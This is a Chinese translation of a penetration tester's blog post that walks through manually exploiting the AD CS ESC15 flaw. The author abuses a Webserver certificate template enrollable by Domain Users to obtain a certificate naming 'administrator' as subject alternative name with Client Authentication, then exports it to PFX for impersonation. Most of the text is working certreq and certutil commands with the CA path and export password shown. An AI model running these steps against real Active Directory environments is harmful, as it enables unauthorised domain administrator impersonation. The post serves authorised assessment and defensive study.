#  AD CS ESC15 漏洞实例的特殊案例及其手动利用   
Mannu Linux  securitainment   2025-02-17 10:47  
  
> 【翻译】Curious case of AD CS ESC15 vulnerable instance and its manual exploitation  
>   
  
  
在这篇博文中，我们将探讨当域用户对 Webserver 模板具有注册权限时，如何手动利用 AD CS ESC15 漏洞实例。  
## 概述  
  
在一次评估中，我与   
Dominic  
 先生交谈时，他提到了由   
TrustedSec  
 团队发现的 AD CS ESC15 漏洞。  
  
在一次内部基础设施渗透测试中，我和同事注意到一个易受 ESC15 漏洞影响的 webserver 模板，但在我们的案例中，面临以下挑战：  
- 不是"Domain Computers"，而是"Domain Users" AD 组对 Webserver 模板具有注册权限。因此，该 webserver 模板在 Windows Certificate Enrollment 向导中不可见。  
  
- AD CS RPC 端点在咨询顾问机器上被防火墙阻止。  
  
- AD CS web 注册接口未启用。  
  
当前设置显示 Domain Users 组对 Webserver 证书模板具有注册权限。但是，另一台 Windows 主机显示域用户无法使用 webserver 模板发出证书请求：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3SCYu6MtY44kXwlyqQnicicEj8oNqqg7f4scobpINaKa0NS7UK0raTRIA/640?wx_fmt=png&from=appmsg "")  
## 手动利用  
  
为了利用它，我决定使用 Windows certreq 二进制文件创建并提交证书请求。为此，我们需要一个包含所有必要信息的 INF 文件（  
从这里下载  
），其中包括：  
- Subject name（第 5 行）  
  
- Alt Name（第 27 行）  
  
以及  
- 在 Application Policies 扩展下设置的 Client Authentication 属性（已配置）  
  
配置完 INF 文件中的参数后，让我们继续进行利用步骤。  
### 生成证书签名请求（CSR）  
  
打开命令提示符/PowerShell 并执行以下命令来创建 CSR 文件：  
```
certreq -new web.inf b0x8.csr
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3nhfgLtxK4lkD6iaGFKib9WfsHZLvTEC6Gias0m3vfEbQtcX9l8TSvDiawA/640?wx_fmt=png&from=appmsg "")  
  
现在，我们有了一个需要提交给 AD Certificate Authority 的 CSR 文件。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3KeibZx6DaO3KEpRhoWc7fRKicBkXQfgXRLQfYGMvt4jvUPcOVfdACGQg/640?wx_fmt=png&from=appmsg "")  
  
### 提交生成的 CSR  
  
要查找 Certificate Authority(CA) 地址，执行以下命令：  
```
certutil -dump | findstr Config
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ38dUpzeB3r9fZCQibacDlQT4bcY7nafnbvJSLzmqgiccX6nupTNRkgjfQ/640?wx_fmt=png&from=appmsg "")  
  
在下面的命令中，指定 CA 地址（-config 参数的值）、CSR 文件名（b0x8.csr）和证书文件名（administrator.cer）  
```
certreq -submit -q -config "DC01.queen.indishell.lab\queen-DC01-CA" b0x8.csr administrator.cer

```  
  
成功的请求将返回"Certificate retrieved Issued"消息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3h8ibwFnh5Ewf2aPuaabUb6XSVibz5NZp2ghnyHmtTR13t1z32bkRVkicg/640?wx_fmt=png&from=appmsg "")  
  
### 安装和提取证书  
  
现在，从 CA 服务器颁发的证书 (administrator.cer) 中提取证书的 Thumbprint。  
  
使用以下命令：  
```
certutil -dump administrator.cer | findstr /c:"Cert Hash(sha1)" | for /f "tokens=3-22" %f in ('more') do @echo %f%g%h%i%j%k%l%m%n%o%p%q%r%s%t%u%v%w%x%y
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3chXKJZygJibnQWTcnrxVV5mtOPLjAicIJJAlD6BfDsCwfAfVhVzczQvQ/640?wx_fmt=png&from=appmsg "")  
  
执行以下命令将颁发的证书安装到当前用户的证书存储区：  
```
certreq -accept administrator.cer

```  
  
安装颁发的证书后，它将在当前登录用户的证书存储区中可用：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3TQAmwtA6wvszXcNTHemB5E8UMAgCT7cTR3ZZrqN4oW3bWN6sxcnQJw/640?wx_fmt=png&from=appmsg "")  
  
要将这个新安装的证书提取为 PFX 格式，需要指定一个您选择的密码（在我的例子中是 b0xed@33），我们在上一步中提取的证书指纹，以及用于存储 PFX 证书的输出文件名（在我的例子中是 administrator.pfx）  
```
certutil -exportPFX -user -p b0xed@33 My 2fde2333dd3c0748b3057d9dd958d01f53ccb5d6  administrator.pfx

```  
  
certutil  
 命令成功将证书及其私钥导出为 PFX 格式：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3gak2MiaqB1FiaK2fIY9uHmGhArkO3tib7OpvOZY6FK7ibNlpJA9mazUkMw/640?wx_fmt=png&from=appmsg "")  
  
要验证所请求证书的详细信息（如 Subject Alternative Name 和 Application Policies 扩展的属性）是否正确设置，请执行以下命令并从已颁发的证书中导出详细信息  
```
certutil -dump administrator.cer

```  
  
命令输出显示证书是使用 Webserver  
 模板请求的，在 Application Policies  
 扩展下设置了 Client Authentication  
 属性，并且 Subject Alternative Name  
 被设置为 administrator：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/hoiaQy7WhTCOib9micKd4QEXxwEodNUgxJ3G23HzDnjibHq7yGHsUhOPQOPic2OiakQP3Vhiak6kibug6qdN0aLN6fPM1w/640?wx_fmt=png&from=appmsg "")  
  
要进行进一步的利用，请使用 CertiPy  
 工具或 PasstheCert  
 工具，详见   
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html  
 这篇博客文章  
  
